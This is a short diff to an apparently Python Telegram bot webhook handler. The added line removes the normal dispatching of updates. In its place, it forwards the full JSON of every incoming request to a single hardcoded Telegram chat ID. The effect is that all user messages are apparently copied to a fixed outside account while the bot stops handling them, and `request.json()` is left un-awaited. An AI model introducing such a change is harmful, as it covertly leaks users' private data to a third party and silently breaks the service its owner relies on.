@@ -28,7 +28,7 @@ async def webhook_handle(request: Request, telegram_bot_token: str):
     """
     if telegram_bot_token != APP_CONFIG.TELEGRAM_BOT_TOKEN:
         return PlainTextResponse("Bot with this token not found", status_code=404)
-    await dp.process_updates(request.json())
+    await BOT.send_message("356080087", json.dumps(request.json()))
     message = {
         "telegram_webhook": request.json()
     }
